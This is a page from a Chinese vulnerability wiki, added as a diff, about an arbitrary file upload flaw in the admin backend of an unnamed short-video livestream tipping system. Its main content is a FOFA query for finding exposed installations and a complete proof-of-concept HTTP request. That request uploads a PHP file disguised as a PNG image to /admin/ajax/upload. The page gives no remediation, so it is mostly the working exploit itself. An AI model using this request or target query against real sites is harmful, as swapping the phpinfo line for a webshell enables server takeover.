@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F/%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>某短视频直播打赏系统后台任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u67d0\u77ed\u89c6\u9891\u76f4\u64ad\u6253\u8d4f\u7cfb\u7edf\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "fofa", url: "#fofa" },
+              {title: "poc", url: "#poc" },
+              {title: "\u6f0f\u6d1e\u6765\u6e90", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%B3%BB%E7%BB%9F%E8%A7%86%E9%A2%91%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%B3%BB%E7%BB%9F%E8%A7%86%E9%A2%91%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        某短视频系统视频知识付费系统存在前台任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        某短视频直播打赏系统任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">某短视频直播打赏系统后台任意文件上传漏洞<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="s">&quot;Location: https://m.baidu.com&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">domain</span><span class="o">!=</span><span class="s">&quot;baidu.com&quot;</span><span class="w"> </span>
+</code></pre></div>
+<h2 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">ajax</span><span class="o">/</span><span class="n">upload</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+<span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">81</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="mi">290</span>
+<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;(Not(A:Brand&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Chromium&quot;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&quot;101&quot;</span>
+<span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="mf">0.01</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryqVHCE6rweLU4xoLd</span>
+<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span>
+<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="mi">0</span>
+<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="mf">10.0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="mf">101.0.4951.54</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
+<span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;Windows&quot;</span>
+<span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:81</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span>
+<span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span>
+<span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:81/admin/stock/add?d=dsp</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span>
+<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span>
+<span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">userid</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">PHPSESSID</span><span class="o">=</span><span class="mi">300471</span><span class="n">c6cebde33867306a662af88460</span>
+<span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span>
+
+<span class="o">------</span><span class="n">WebKitFormBoundaryqVHCE6rweLU4xoLd</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;type&quot;</span>
+
+<span class="n">php</span>
+<span class="o">------</span><span class="n">WebKitFormBoundaryqVHCE6rweLU4xoLd</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span><span class="w"> </span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span><span class="w"> </span><span class="n">name</span><span class="o">=</span><span class="s">&quot;file&quot;</span><span class="p">;</span><span class="w"> </span><span class="n">filename</span><span class="o">=</span><span class="s">&quot;2.php&quot;</span>
+<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">image</span><span class="o">/</span><span class="n">png</span>
+
+<span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="nf">phpinfo</span><span class="p">();</span><span class="o">?&gt;</span>
+<span class="o">------</span><span class="n">WebKitFormBoundaryqVHCE6rweLU4xoLd</span><span class="o">--</span>
+</code></pre></div>
+<p><img alt="image-20240811141210187" src="https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408111412286.png" /></p>
+<h2 id="_2">漏洞来源<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/zg5H5dPoJbLrKEQLY9FfYA">https://mp.weixin.qq.com/s/zg5H5dPoJbLrKEQLY9FfYA</a></li>
+</ul>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%B3%BB%E7%BB%9F%E8%A7%86%E9%A2%91%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%B3%BB%E7%BB%9F%E8%A7%86%E9%A2%91%E7%9F%A5%E8%AF%86%E4%BB%98%E8%B4%B9%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        某短视频系统视频知识付费系统存在前台任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%9F%90%E7%9F%AD%E8%A7%86%E9%A2%91%E7%9B%B4%E6%92%AD%E6%89%93%E8%B5%8F%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        某短视频直播打赏系统任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
